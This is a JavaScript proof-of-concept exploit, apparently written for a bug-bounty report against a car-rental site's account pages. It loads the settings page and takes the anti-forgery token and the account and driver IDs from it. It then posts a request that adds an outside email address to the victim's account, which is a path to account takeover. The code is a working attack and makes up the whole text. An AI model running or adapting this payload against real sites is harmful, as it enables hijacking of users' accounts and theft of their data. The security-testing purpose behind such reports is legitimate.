var url = "/account/SettingsRedesign.do";
var xhr = new XMLHttpRequest();
    xhr.responseType = "document";
    xhr.open("GET", url, true);
    xhr.onload = function (e) {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            page = xhr.response
	//

	token = page.getElementById("strutsToken").value;
	accountHolderId = page.getElementById("account_holder_name").getAttribute('data-account-holder-id');;
	datadriverid = page.getElementById("account_holder_name").getAttribute('data-driver-id');;
	// Show the token
	
	console.log("The token is: " + token);
	console.log("accountHolderId: " + accountHolderId);
	console.log("accountHolderId: " + datadriverid);


	var http = new XMLHttpRequest();
	var params = "accountHolderId=107316836&emailAddress="+escape("fsdfsdfwe@gmail.com")+"&"+escape("org.apache.struts.taglib.html.TOKEN")+"=254849900c171108d7772c65d5740135&driverId=33211050";
	http.open("POST", "/account/AddEmailAjaxAction.do?crmActionType=addEmailAddress", true);

	http.setRequestHeader("Origin","https://secure.rentalcars.com");
	http.setRequestHeader("Accept","*/*");
	http.setRequestHeader("X-Requested-With","XMLHttpRequest");
	http.setRequestHeader("Connection","close");
	http.setRequestHeader("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36");
	http.setRequestHeader("Sec-Fetch-Site","same-origin");
	http.setRequestHeader("Sec-Fetch-Dest","empty");
	http.setRequestHeader("Accept-Encoding","gzip, deflate");
	http.setRequestHeader("Sec-Fetch-Mode","cors");
	http.setRequestHeader("ADRUM","isAjax:true");
	http.setRequestHeader("Accept-Language","en,es;q=0.9");
	http.setRequestHeader("Content-Type","application/x-www-form-urlencoded");

	http.onreadystatechange = function() {
    	if(http.readyState == 4 && http.status == 200) {
        	console.info(http.status);
        	console.info(http.responseText);
    }
}
	http.send('accountHolderId='+accountHolderId+'&driverId='+datadriverid+'&emailAddress=zonduu%2Bplspls2%40wearehackerone.com&org.apache.struts.taglib.html.TOKEN='+token);
        }
    };

xhr.send(null);
